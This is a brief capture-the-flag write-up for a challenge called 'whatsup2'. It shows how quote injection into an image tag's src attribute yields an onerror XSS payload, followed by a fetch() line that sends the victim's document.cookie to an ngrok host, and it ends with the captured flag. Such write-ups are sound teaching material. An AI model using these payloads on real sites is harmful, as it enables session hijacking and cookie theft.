# whatsup2

## What is it

Same as whatsup, except we can also send an image.

The method used in whatsup doesn't work, the html is not interpreted.

## Solution

The way the image link is inserted in the element looks probably something like this:
```js
'<img src="' + input + '">'
```

We can put '"' in our input to change other properties.

We can execute code by putting a bad link and putting code in ```src/onerror``` ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onerror))

Input:
```
abc" src/onerror="alert(1)
```
Result html:
```html
<img src="abc" src/onerror="alert(1)">
```

We can then use the same method we used in whatsup to get the cookie:
```
abc" src/onerror="fetch('https://7f09-163-5-23-68.eu.ngrok.io', {method: 'post', body: document.cookie})
```

flag: ```BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}```
